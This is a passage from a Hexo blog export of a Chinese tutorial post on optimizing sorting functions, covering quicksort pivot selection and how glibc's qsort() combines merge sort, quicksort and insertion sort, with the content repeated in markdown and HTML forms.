2、随机法\n\n随机法就是每次从要排序的区间中，随机选择一个元素作为分区点。这种方法并不能保证每次分区点都选的比较好，但是从概率的角度来看，也不大可能会出现每次分区点都选的很差的情况，所以平均情况下，这样选择的分区点是比较好的，时间复杂度退化为最糟糕的O(n^2)的情况，出现的可能性不大。\n\n好了，我这里也只是抛砖引玉，如果想了解更多寻找分区点的方法，你可以自己深入学习一下。\n\n我们知道，快速排序使用递归实现的，我们在递归那一节讲过，递归要警惕堆栈溢出，为了避免快速排序里，递归过深而堆栈过小，导致堆栈溢出，我们有两种解决办法：第一种是限制递归深度。一旦递归过深，超过了我们事先设定的阈值，就停止递归。第二种是通过在堆上模拟实现一个函数调用栈，手动模拟递归压栈、出栈的过程，这样就没有了系统栈大小的限制。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 举例分析排序算法\n{% endnote %}\n</div>\n\n为了让你对如何实现一个排序函数有一个更直观的感受，我那Glibc中的qsort()函数举例说明一下。虽然qsort()从名字上看，很像是基于快速排序算法实现的，实际上它并不仅仅用了快排一种算法。\n\n如果你去看源码，你就会发现，**qsort()会优先使用归并排序来排序输入数据**，因为归并排序的空间复杂度是O(n),所以对于小数据量的排序，比如1KB、2KB等，归并排序额外需要1KB、2KB的内存空间，这个问题不大。现在计算机内存都挺大的，我们很多时候追求的是速度。还记得我们前面讲过的用空间换时间的技巧吗？这就是一个典型的应用。\n\n但是如果数据量太大，就跟我们前面提到的，排序100MB的数据，这个时候我们再用归并排序就不合适了。所以，**要排序的数据量比较大时，qsort()会改为采用快速排序算法来排序**。\n\n那qsort()是如何选择快速排序算法的分区点的呢？如果去看源码，你就会发现，qsort()选择分区点的方法就是\"三数取中法\"，是不是也不复杂？\n\n还有我们前面提到的递归太深会导致堆栈溢出的问题，qsort()是通过自己实现一个堆上的栈，手动模拟递归来解决的。我们之前将递归那一节也讲过，不知道你还有没有印象。\n\n实际上，qsort()并不仅仅用到了归并排序和快速排序，它还用到了插入排序。在快速排序的过程中，当要排序的区间中，元素的个数小于等于3时，qsort()就退化为插入排序，不在继续用递归来做快速排序，因为我们前面也讲过，在小规模数据面前，O(n^2)时间复杂度的算法并不一定比O(nlogn)的算法执行时间长。\n\n我们在讲时间复杂度的时候讲过，算法的性能可以通过时间复杂度来分析，但是这种复杂度分析是比较偏理论的，如果我们深究的话，时间上时间复杂度并不等于代码的实际执行时间。\n\n时间复杂度代表的是一个增长趋势，如果画成增长曲线图，你会发现O(n^2)比O(nlogn)要陡峭，也就是说增长趋势要更猛一些。但是，我们前面讲过，在大O复杂度表示法中，我们会省略低阶、系数、常数，也就是说，O(nlogn)在没有省略低阶、系数、常数之前可能是O(knlogn + c)，而且k和c有可能还是一个比较大的数。\n\n假设k=1000， c=200，当我们对小规模数据(比如n=100)排序时，n^2 的值实际上比knlogn + c还要大小。\n\n所以对于小规模数据的排序，O(n^2)的排序算法并不一定比O(nlogn)排序算法执行的时间长。对于小数据量的排序，我们选择比较简单、不需要递归的插入排序算法。\n\n还记得我们之前讲到的哨兵来简化代码，提高执行效率吗？在qsort()插入排序的算法实现中，也利用了这种编程技巧。虽然哨兵可能只是少做一次判断，但是毕竟排序函数是非常常用、非常基础的函数，性能的优化要做到极致。\n\n好了，C语言的qsort()已经分析完了，有没有觉得其实也不是很难？基本上都是用了我们前面讲到的知识点，有了前面的知识点的积累，看一些底层的类库的时候是不是也更容易了？\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n今天共同分析了一下如何来实现一个工业级的通用的、高效的排序函数，内容比较偏实战，而且贯穿了一些前面的章节，你要多看几遍。我们大部分排序函数都是采用O(nlogn)排序算法来实现，但是为了尽可能地提高性能，会做很多优化。\n\n我还重点讲了一下快速排序的一些优化策略，比如合理选择分区点，避免递归太深等等。最后，带你分析了一下C语言中qsort()的底层实现原理，希望你能对此有一个更加直观的感受。\n\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-排序优化.md","raw":"---\ntitle: 算法-排序优化\ndate: 2018-11-09 14:30:30\ntags: ['算法','排序','排序优化']\ncategories: 算法\nmathjax: true\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n几乎所有的编程语言中都会提供排序函数，比如C语言中qsort()，C++ STL中的sort()、stable_sort()，还有java中Collections.sort()。在平时开发中，我们都是直接使用这些现成的函数来实现业务逻辑中的排序功能。那你知道这些排序函数是如何实现的吗？底层都利用了那些排序算法？\n\n基于这些问题，今天我们就来看看排序这部分的最后一块内容:**如何实现一个通用的、高性能的排序算法？**\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何选择合适的排序算法？\n{% endnote %}\n</div>\n\n如果要实现一个通用的、高效率的排序函数，我们应该选择哪种排序算法？我们先回顾一下前面讲过的几种排序算法。\n\n| 排序算法 | 时间复杂度  | 是否稳定排序？ | 是否原地排序？|\n|---------|-------------|---------------|--------------|\n| 冒泡排序 | $O(n^2)$    | √             | √            |\n| 插入排序 | $O(n^2)$    | √             | √            |\n| 选择排序 | $O(n^2)$    | ×             | √            |\n| 归并排序 | $O(n*logn)$ | √             | ×            |\n| 快速排序 | $O(n*logn)$ | ×             | √            |\n| 桶排序   | $O(n)$      | √             | ×            |\n| 计数排序 | $O(n+k)$    | √             | ×            |\n| 基数排序 | $O(dn)$     | √             | ×            |\n\n\n我们前面讲过，线性排序算法的时间复杂度比较低，适用场景比较特殊。所以如果要写一个通用排序函数，不能选择线性排序算法。\n\n如果对小规模数据进行排序，可以选择时间复杂度为$O(n^2)$的排序算法，如果对大规模数据进行排序，时间复杂度是$O(n\\*logn)$的的算法更加高效。所以，为了兼顾任意规模数据的排序，一般都会首选时间复杂度为$O(n\\*logn)$的算法来实现排序函数。\n\n时间复杂度为$O(n\\*logn)$的函数不止一个，我们已经讲过的有归并排序、快速排序。后面讲堆的时候我们还会讲堆排序。堆排序和快速排序都有比较多的应用，比如java语言采用堆排序实现排序函数，C语言使用排序排序实现排序函数。\n\n不知道你有没有发现，使用归并排序的情况其实并不多。我们知道，快速排序最坏情况下时间复杂度是$O(n^2)$。而归并排序可以做到平均情况、最坏情况的时间复杂度都是$O(n\\*logn)$，从这点看起来很诱人，那为什么它还是没能得到“宠幸”呢？\n\n还记得我们上一节将的归并排序的空间复杂度吗？归并排序并不是原地排序算法，空间复杂度是$O(n)$，所以，粗略的将，如果要排序100MB的数据，除了数据本身占用的内存之外，排序算法还要额外在占用100MB的内存空间，空间消耗就翻倍了。\n\n前面我们讲到，快速排序比较适合用来实现排序函数，但是我们也知道，快速排序在最坏情况下时间复杂度是O(n^2),如何来解决这个“复杂度恶化”问题呢？\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何优化快速排序？\n{% endnote %}\n</div>\n\n我们先来看下，为什么最坏情况下快速排序的时间复杂度是O(n^2)呢？我们前面讲过，如果数据原来就是有序或者接近有序的，每次分区点都选择最后一个数据，那快速排序算法就会变得非常糟糕，时间复杂度就会退化为O(n^2)。实际上，这种O(n^2)时间复杂度出现的主要原因还是因为我们分区点选择的不够合理。\n\n那什么样的分区点是好的分区点呢？或者说如何来选择分区点呢？\n\n最理想的分区点是：**被分开的两个分区中，数据的数量差不多**\n\n如果很粗暴的直接选择第一个或者最后一个数据最为分区点，不考虑数据的特点，肯定会出现前面讲的那样，在某些情况下，排序的最坏情况时间复杂度是O(N^2)。为了提高算法的性能，我们也要尽可能的让每次分区都比较平均。\n\n我这里介绍两种比较常用、比较简单的分区算法，你可以直观感受一下。\n\n#### 1、三数取中法\n\n我们从区间的首、尾、中间，分别取一个数，然后对比大小，取这三个数的中间值作为分区点。这样每间隔某个固定的长度，取数据出来比较，将中间值作为分区点的分区算法，肯定要比单纯取某一个数据更好。但是，如果要排序的数组比较大，那三数取中可能就不够了，可能要“五数取中”或者\"十数取中\"。\n\n#### 2、随机法\n\n随机法就是每次从要排序的区间中，随机选择一个元素作为分区点。这种方法并不能保证每次分区点都选的比较好，但是从概率的角度来看，也不大可能会出现每次分区点都选的很差的情况，所以平均情况下，这样选择的分区点是比较好的，时间复杂度退化为最糟糕的O(n^2)的情况，出现的可能性不大。\n\n好了，我这里也只是抛砖引玉，如果想了解更多寻找分区点的方法，你可以自己深入学习一下。\n\n我们知道，快速排序使用递归实现的，我们在递归那一节讲过，递归要警惕堆栈溢出，为了避免快速排序里，递归过深而堆栈过小，导致堆栈溢出，我们有两种解决办法：第一种是限制递归深度。一旦递归过深，超过了我们事先设定的阈值，就停止递归。第二种是通过在堆上模拟实现一个函数调用栈，手动模拟递归压栈、出栈的过程，这样就没有了系统栈大小的限制。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 举例分析排序算法\n{% endnote %}\n</div>\n\n为了让你对如何实现一个排序函数有一个更直观的感受，我那Glibc中的qsort()函数举例说明一下。虽然qsort()从名字上看，很像是基于快速排序算法实现的，实际上它并不仅仅用了快排一种算法。\n\n如果你去看源码，你就会发现，**qsort()会优先使用归并排序来排序输入数据**，因为归并排序的空间复杂度是O(n),所以对于小数据量的排序，比如1KB、2KB等，归并排序额外需要1KB、2KB的内存空间，这个问题不大。现在计算机内存都挺大的，我们很多时候追求的是速度。还记得我们前面讲过的用空间换时间的技巧吗？这就是一个典型的应用。\n\n但是如果数据量太大，就跟我们前面提到的，排序100MB的数据，这个时候我们再用归并排序就不合适了。所以，**要排序的数据量比较大时，qsort()会改为采用快速排序算法来排序**。\n\n那qsort()是如何选择快速排序算法的分区点的呢？如果去看源码，你就会发现，qsort()选择分区点的方法就是\"三数取中法\"，是不是也不复杂？\n\n还有我们前面提到的递归太深会导致堆栈溢出的问题，qsort()是通过自己实现一个堆上的栈，手动模拟递归来解决的。我们之前将递归那一节也讲过，不知道你还有没有印象。\n\n实际上，qsort()并不仅仅用到了归并排序和快速排序，它还用到了插入排序。在快速排序的过程中，当要排序的区间中，元素的个数小于等于3时，qsort()就退化为插入排序，不在继续用递归来做快速排序，因为我们前面也讲过，在小规模数据面前，O(n^2)时间复杂度的算法并不一定比O(nlogn)的算法执行时间长。\n\n我们在讲时间复杂度的时候讲过，算法的性能可以通过时间复杂度来分析，但是这种复杂度分析是比较偏理论的，如果我们深究的话，时间上时间复杂度并不等于代码的实际执行时间。\n\n时间复杂度代表的是一个增长趋势，如果画成增长曲线图，你会发现O(n^2)比O(nlogn)要陡峭，也就是说增长趋势要更猛一些。但是，我们前面讲过，在大O复杂度表示法中，我们会省略低阶、系数、常数，也就是说，O(nlogn)在没有省略低阶、系数、常数之前可能是O(knlogn + c)，而且k和c有可能还是一个比较大的数。\n\n假设k=1000， c=200，当我们对小规模数据(比如n=100)排序时，n^2 的值实际上比knlogn + c还要大小。\n\n所以对于小规模数据的排序，O(n^2)的排序算法并不一定比O(nlogn)排序算法执行的时间长。对于小数据量的排序，我们选择比较简单、不需要递归的插入排序算法。\n\n还记得我们之前讲到的哨兵来简化代码，提高执行效率吗？在qsort()插入排序的算法实现中，也利用了这种编程技巧。虽然哨兵可能只是少做一次判断，但是毕竟排序函数是非常常用、非常基础的函数，性能的优化要做到极致。\n\n好了，C语言的qsort()已经分析完了，有没有觉得其实也不是很难？基本上都是用了我们前面讲到的知识点，有了前面的知识点的积累，看一些底层的类库的时候是不是也更容易了？\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n今天共同分析了一下如何来实现一个工业级的通用的、高效的排序函数，内容比较偏实战，而且贯穿了一些前面的章节，你要多看几遍。我们大部分排序函数都是采用O(nlogn)排序算法来实现，但是为了尽可能地提高性能，会做很多优化。\n\n我还重点讲了一下快速排序的一些优化策略，比如合理选择分区点，避免递归太深等等。最后，带你分析了一下C语言中qsort()的底层实现原理，希望你能对此有一个更加直观的感受。\n\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-排序优化","published":1,"updated":"2019-06-26T03:52:03.525Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2mo004ro25tekq8xiq4","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>几乎所有的编程语言中都会提供排序函数，比如C语言中qsort()，C++ STL中的sort()、stable_sort()，还有java中Collections.sort()。在平时开发中，我们都是直接使用这些现成的函数来实现业务逻辑中的排序功能。那你知道这些排序函数是如何实现的吗？底层都利用了那些排序算法？</p>\n<p>基于这些问题，今天我们就来看看排序这部分的最后一块内容:<strong>如何实现一个通用的、高性能的排序算法？</strong></p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何选择合适的排序算法？\"><a href=\"#如何选择合适的排序算法？\" class=\"headerlink\" title=\"如何选择合适的排序算法？\"></a>如何选择合适的排序算法？</h3></div><br></div>\n\n<p>如果要实现一个通用的、高效率的排序函数，我们应该选择哪种排序算法？我们先回顾一下前面讲过的几种排序算法。</p>\n<table>\n<thead>\n<tr>\n<th>排序算法</th>\n<th>时间复杂度</th>\n<th>是否稳定排序？</th>\n<th>是否原地排序？</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>冒泡排序</td>\n<td>$O(n^2)$</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>插入排序</td>\n<td>$O(n^2)$</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>选择排序</td>\n<td>$O(n^2)$</td>\n<td>×</td>\n<td>√</td>\n</tr>\n<tr>\n<td>归并排序</td>\n<td>$O(n*logn)$</td>\n<td>√</td>\n<td>×</td>\n</tr>\n<tr>\n<td>快速排序</td>\n<td>$O(n*logn)$</td>\n<td>×</td>\n<td>√</td>\n</tr>\n<tr>\n<td>桶排序</td>\n<td>$O(n)$</td>\n<td>√</td>\n<td>×</td>\n</tr>\n<tr>\n<td>计数排序</td>\n<td>$O(n+k)$</td>\n<td>√</td>\n<td>×</td>\n</tr>\n<tr>\n<td>基数排序</td>\n<td>$O(dn)$</td>\n<td>√</td>\n<td>×</td>\n</tr>\n</tbody>\n</table>\n<p>我们前面讲过，线性排序算法的时间复杂度比较低，适用场景比较特殊。所以如果要写一个通用排序函数，不能选择线性排序算法。</p>\n<p>如果对小规模数据进行排序，可以选择时间复杂度为$O(n^2)$的排序算法，如果对大规模数据进行排序，时间复杂度是$O(n*logn)$的的算法更加高效。所以，为了兼顾任意规模数据的排序，一般都会首选时间复杂度为$O(n*logn)$的算法来实现排序函数。</p>\n<p>时间复杂度为$O(n*logn)$的函数不止一个，我们已经讲过的有归并排序、快速排序。后面讲堆的时候我们还会讲堆排序。堆排序和快速排序都有比较多的应用，比如java语言采用堆排序实现排序函数，C语言使用排序排序实现排序函数。</p>\n<p>不知道你有没有发现，使用归并排序的情况其实并不多。我们知道，快速排序最坏情况下时间复杂度是$O(n^2)$。而归并排序可以做到平均情况、最坏情况的时间复杂度都是$O(n*logn)$，从这点看起来很诱人，那为什么它还是没能得到“宠幸”呢？</p>\n<p>还记得我们上一节将的归并排序的空间复杂度吗？归并排序并不是原地排序算法，空间复杂度是$O(n)$，所以，粗略的将，如果要排序100MB的数据，除了数据本身占用的内存之外，排序算法还要额外在占用100MB的内存空间，空间消耗就翻倍了。</p>\n<p>前面我们讲到，快速排序比较适合用来实现排序函数，但是我们也知道，快速排序在最坏情况下时间复杂度是O(n^2),如何来解决这个“复杂度恶化”问题呢？</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何优化快速排序？\"><a href=\"#如何优化快速排序？\" class=\"headerlink\" title=\"如何优化快速排序？\"></a>如何优化快速排序？</h3></div><br></div>\n\n<p>我们先来看下，为什么最坏情况下快速排序的时间复杂度是O(n^2)呢？我们前面讲过，如果数据原来就是有序或者接近有序的，每次分区点都选择最后一个数据，那快速排序算法就会变得非常糟糕，时间复杂度就会退化为O(n^2)。实际上，这种O(n^2)时间复杂度出现的主要原因还是因为我们分区点选择的不够合理。</p>\n<p>那什么样的分区点是好的分区点呢？或者说如何来选择分区点呢？</p>\n<p>最理想的分区点是：<strong>被分开的两个分区中，数据的数量差不多</strong></p>\n<p>如果很粗暴的直接选择第一个或者最后一个数据最为分区点，不考虑数据的特点，肯定会出现前面讲的那样，在某些情况下，排序的最坏情况时间复杂度是O(N^2)。为了提高算法的性能，我们也要尽可能的让每次分区都比较平均。</p>\n<p>我这里介绍两种比较常用、比较简单的分区算法，你可以直观感受一下。</p>\n<h4 id=\"1、三数取中法\"><a href=\"#1、三数取中法\" class=\"headerlink\" title=\"1、三数取中法\"></a>1、三数取中法</h4><p>我们从区间的首、尾、中间，分别取一个数，然后对比大小，取这三个数的中间值作为分区点。这样每间隔某个固定的长度，取数据出来比较，将中间值作为分区点的分区算法，肯定要比单纯取某一个数据更好。但是，如果要排序的数组比较大，那三数取中可能就不够了，可能要“五数取中”或者”十数取中”。</p>\n<h4 id=\"2、随机法\"><a href=\"#2、随机法\" class=\"headerlink\" title=\"2、随机法\"></a>2、随机法</h4><p>随机法就是每次从要排序的区间中，随机选择一个元素作为分区点。这种方法并不能保证每次分区点都选的比较好，但是从概率的角度来看，也不大可能会出现每次分区点都选的很差的情况，所以平均情况下，这样选择的分区点是比较好的，时间复杂度退化为最糟糕的O(n^2)的情况，出现的可能性不大。</p>\n<p>好了，我这里也只是抛砖引玉，如果想了解更多寻找分区点的方法，你可以自己深入学习一下。</p>\n<p>我们知道，快速排序使用递归实现的，我们在递归那一节讲过，递归要警惕堆栈溢出，为了避免快速排序里，递归过深而堆栈过小，导致堆栈溢出，我们有两种解决办法：第一种是限制递归深度。一旦递归过深，超过了我们事先设定的阈值，就停止递归。第二种是通过在堆上模拟实现一个函数调用栈，手动模拟递归压栈、出栈的过程，这样就没有了系统栈大小的限制。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"举例分析排序算法\"><a href=\"#举例分析排序算法\" class=\"headerlink\" title=\"举例分析排序算法\"></a>举例分析排序算法</h3></div><br></div>\n\n<p>为了让你对如何实现一个排序函数有一个更直观的感受，我那Glibc中的qsort()函数举例说明一下。虽然qsort()从名字上看，很像是基于快速排序算法实现的，实际上它并不仅仅用了快排一种算法。</p>\n<p>如果你去看源码，你就会发现，<strong>qsort()会优先使用归并排序来排序输入数据</strong>，因为归并排序的空间复杂度是O(n),所以对于小数据量的排序，比如1KB、2KB等，归并排序额外需要1KB、2KB的内存空间，这个问题不大。现在计算机内存都挺大的，我们很多时候追求的是速度。还记得我们前面讲过的用空间换时间的技巧吗？这就是一个典型的应用。</p>\n<p>但是如果数据量太大，就跟我们前面提到的，排序100MB的数据，这个时候我们再用归并排序就不合适了。所以，<strong>要排序的数据量比较大时，qsort()会改为采用快速排序算法来排序</strong>。</p>\n<p>那qsort()是如何选择快速排序算法的分区点的呢？如果去看源码，你就会发现，qsort()选择分区点的方法就是”三数取中法”，是不是也不复杂？</p>\n<p>还有我们前面提到的递归太深会导致堆栈溢出的问题，qsort()是通过自己实现一个堆上的栈，手动模拟递归来解决的。我们之前将递归那一节也讲过，不知道你还有没有印象。</p>\n<p>实际上，qsort()并不仅仅用到了归并排序和快速排序，它还用到了插入排序。在快速排序的过程中，当要排序的区间中，元素的个数小于等于3时，qsort()就退化为插入排序，不在继续用递归来做快速排序，因为我们前面也讲过，在小规模数据面前，O(n^2)时间复杂度的算法并不一定比O(nlogn)的算法执行时间长。</p>\n<p>我们在讲时间复杂度的时候讲过，算法的性能可以通过时间复杂度来分析，但是这种复杂度分析是比较偏理论的，如果我们深究的话，时间上时间复杂度并不等于代码的实际执行时间。</p>\n<p>时间复杂度代表的是一个增长趋势，如果画成增长曲线图，你会发现O(n^2)比O(nlogn)要陡峭，也就是说增长趋势要更猛一些。但是，我们前面讲过，在大O复杂度表示法中，我们会省略低阶、系数、常数，也就是说，O(nlogn)在没有省略低阶、系数、常数之前可能是O(knlogn + c)，而且k和c有可能还是一个比较大的数。</p>\n<p>假设k=1000， c=200，当我们对小规模数据(比如n=100)排序时，n^2 的值实际上比knlogn + c还要大小。</p>\n<p>所以对于小规模数据的排序，O(n^2)的排序算法并不一定比O(nlogn)排序算法执行的时间长。对于小数据量的排序，我们选择比较简单、不需要递归的插入排序算法。</p>\n<p>还记得我们之前讲到的哨兵来简化代码，提高执行效率吗？在qsort()插入排序的算法实现中，也利用了这种编程技巧。虽然哨兵可能只是少做一次判断，但是毕竟排序函数是非常常用、非常基础的函数，性能的优化要做到极致。</p>\n<p>好了，C语言的qsort()已经分析完了，有没有觉得其实也不是很难？基本上都是用了我们前面讲到的知识点，有了前面的知识点的积累，看一些底层的类库的时候是不是也更容易了？</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>今天共同分析了一下如何来实现一个工业级的通用的、高效的排序函数，内容比较偏实战，而且贯穿了一些前面的章节，你要多看几遍。我们大部分排序函数都是采用O(nlogn)排序算法来实现，但是为了尽可能地提高性能，会做很多优化。</p>\n<p>我还重点讲了一下快速排序的一些优化策略，比如合理选择分区点，避免递归太深等等。最后，带你分析了一下C语言中qsort()的底层实现原理，希望你能对此有一个更加直观的感受。</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>几乎所有的编程语言中都会提供排序函数，比如C语言中qsort()，C++ STL中的sort()、stable_sort()，还有java中Collections.sort()。在平时开发中，我们都是直接使用这些现成的函数来实现业务逻辑中的排序功能。那你知道这些排序函数是如何实现的吗？底层都利用了那些排序算法？</p>\n<p>基于这些问题，今天我们就来看看排序这部分的最后一块内容:<strong>如何实现一个通用的、高性能的排序算法？</strong></p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何选择合适的排序算法？\"><a href=\"#如何选择合适的排序算法？\" class=\"headerlink\" title=\"如何选择合适的排序算法？\"></a>如何选择合适的排序算法？</h3></div><br></div>\n\n<p>如果要实现一个通用的、高效率的排序函数，我们应该选择哪种排序算法？我们先回顾一下前面讲过的几种排序算法。</p>\n<table>\n<thead>\n<tr>\n<th>排序算法</th>\n<th>时间复杂度</th>\n<th>是否稳定排序？</th>\n<th>是否原地排序？</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>冒泡排序</td>\n<td>$O(n^2)$</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>插入排序</td>\n<td>$O(n^2)$</td>\n<td>√</td>\n<td>√</td>\n</tr>\n<tr>\n<td>选择排序</td>\n<td>$O(n^2)$</td>\n<td>×</td>\n<td>√</td>\n</tr>\n<tr>\n<td>归并排序</td>\n<td>$O(n*logn)$</td>\n<td>√</td>\n<td>×</td>\n</tr>\n<tr>\n<td>快速排序</td>\n<td>$O(n*logn)$</td>\n<td>×</td>\n<td>√</td>\n</tr>\n<tr>\n<td>桶排序</td>\n<td>$O(n)$</td>\n<td>√</td>\n<td>×</td>\n</tr>\n<tr>\n<td>计数排序</td>\n<td>$O(n+k)$</td>\n<td>√</td>\n<td>×</td>\n</tr>\n<tr>\n<td>基数排序</td>\n<td>$O(dn)$</td>\n<td>√</td>\n<td>×</td>\n</tr>\n</tbody>\n</table>\n<p>我们前面讲过，线性排序算法的时间复杂度比较低，适用场景比较特殊。所以如果要写一个通用排序函数，不能选择线性排序算法。</p>\n<p>如果对小规模数据进行排序，可以选择时间复杂度为$O(n^2)$的排序算法，如果对大规模数据进行排序，时间复杂度是$O(n*logn)$的的算法更加高效。所以，为了兼顾任意规模数据的排序，一般都会首选时间复杂度为$O(n*logn)$的算法来实现排序函数。</p>\n<p>时间复杂度为$O(n*logn)$的函数不止一个，我们已经讲过的有归并排序、快速排序。后面讲堆的时候我们还会讲堆排序。堆排序和快速排序都有比较多的应用，比如java语言采用堆排序实现排序函数，C语言使用排序排序实现排序函数。</p>\n<p>不知道你有没有发现，使用归并排序的情况其实并不多。我们知道，快速排序最坏情况下时间复杂度是$O(n^2)$。而归并排序可以做到平均情况、最坏情况的时间复杂度都是$O(n*logn)$，从这点看起来很诱人，那为什么它还是没能得到“宠幸”呢？</p>\n<p>还记得我们上一节将的归并排序的空间复杂度吗？归并排序并不是原地排序算法，空间复杂度是$O(n)$，所以，粗略的将，如果要排序100MB的数据，除了数据本身占用的内存之外，排序算法还要额外在占用100MB的内存空间，空间消耗就翻倍了。</p>\n<p>前面我们讲到，快速排序比较适合用来实现排序函数，但是我们也知道，快速排序在最坏情况下时间复杂度是O(n^2),如何来解决这个“复杂度恶化”问题呢？</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何优化快速排序？\"><a href=\"#如何优化快速排序？\" class=\"headerlink\" title=\"如何优化快速排序？\"></a>如何优化快速排序？</h3></div><br></div>\n\n<p>我们先来看下，为什么最坏情况下快速排序的时间复杂度是O(n^2)呢？我们前面讲过，如果数据原来就是有序或者接近有序的，每次分区点都选择最后一个数据，那快速排序算法就会变得非常糟糕，时间复杂度就会退化为O(n^2)。实际上，这种O(n^2)时间复杂度出现的主要原因还是因为我们分区点选择的不够合理。</p>\n<p>那什么样的分区点是好的分区点呢？或者说如何来选择分区点呢？</p>\n<p>最理想的分区点是：<strong>被分开的两个分区中，数据的数量差不多</strong></p>\n<p>如果很粗暴的直接选择第一个或者最后一个数据最为分区点，不考虑数据的特点，肯定会出现前面讲的那样，在某些情况下，排序的最坏情况时间复杂度是O(N^2)。为了提高算法的性能，我们也要尽可能的让每次分区都比较平均。</p>\n<p>我这里介绍两种比较常用、比较简单的分区算法，你可以直观感受一下。</p>\n<h4 id=\"1、三数取中法\"><a href=\"#1、三数取中法\" class=\"headerlink\" title=\"1、三数取中法\"></a>1、三数取中法</h4><p>我们从区间的首、尾、中间，分别取一个数，然后对比大小，取这三个数的中间值作为分区点。这样每间隔某个固定的长度，取数据出来比较，将中间值作为分区点的分区算法，肯定要比单纯取某一个数据更好。但是，如果要排序的数组比较大，那三数取中可能就不够了，可能要“五数取中”或者”十数取中”。</p>\n<h4 id=\"2、随机法\"><a href=\"#2、随机法\" class=\"headerlink\" title=\"2、随机法\"></a>2、随机法</h4><p>随机法就是每次从要排序的区间中，随机选择一个元素作为分区点。这种方法并不能保证每次分区点都选的比较好，但是从概率的角度来看，也不大可能会出现每次分区点都选的很差的情况，所以平均情况下，这样选择的分区点是比较好的，时间复杂度退化为最糟糕的O(n^2)的情况，出现的可能性不大。</p>\n<p>好了，我这里也只是抛砖引玉，如果想了解更多寻找分区点的方法，你可以自己深入学习一下。</p>\n<p>我们知道，快速排序使用递归实现的，我们在递归那一节讲过，递归要警惕堆栈溢出，为了避免快速排序里，递归过深而堆栈过小，导致堆栈溢出，我们有两种解决办法：第一种是限制递归深度。一旦递归过深，超过了我们事先设定的阈值，就停止递归。第二种是通过在堆上模拟实现一个函数调用栈，手动模拟递归压栈、出栈的过程，这样就没有了系统栈大小的限制。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"举例分析排序算法\"><a href=\"#举例分析排序算法\" class=\"headerlink\" title=\"举例分析排序算法\"></a>举例分析排序算法</h3></div><br></div>\n\n<p>为了让你对如何实现一个排序函数有一个更直观的感受，我那Glibc中的qsort()函数举例说明一下。虽然qsort()从名字上看，很像是基于快速排序算法实现的，实际上它并不仅仅用了快排一种算法。</p>\n<p>如果你去看源码，你就会发现，<strong>qsort()会优先使用归并排序来排序输入数据</strong>，因为归并排序的空间复杂度是O(n),所以对于小数据量的排序，比如1KB、2KB等，归并排序额外需要1KB、2KB的内存空间，这个问题不大。现在计算机内存都挺大的，我们很多时候追求的是速度。还记得我们前面讲过的用空间换时间的技巧吗？这就是一个典型的应用。</p>\n<p>但是如果数据量太大，就跟我们前面提到的，排序100MB的数据，这个时候我们再用归并排序就不合适了。所以，<strong>要排序的数据量比较大时，qsort()会改为采用快速排序算法来排序</strong>。</p>\n<p>那qsort()是如何选择快速排序算法的分区点的呢？如果去看源码，你就会发现，qsort()选择分区点的方法就是”三数取中法”，是不是也不复杂？</p>\n<p>还有我们前面提到的递归太深会导致堆栈溢出的问题，qsort()是通过自己实现一个堆上的栈，手动模拟递归来解决的。我们之前将递归那一节也讲过，不知道你还有没有印象。</p>\n<p>实际上，qsort()并不仅仅用到了归并排序和快速排序，它还用到了插入排序。在快速排序的过程中，当要排序的区间中，元素的个数小于等于3时，qsort()就退化为插入排序，不在继续用递归来做快速排序，因为我们前面也讲过，在小规模数据面前，O(n^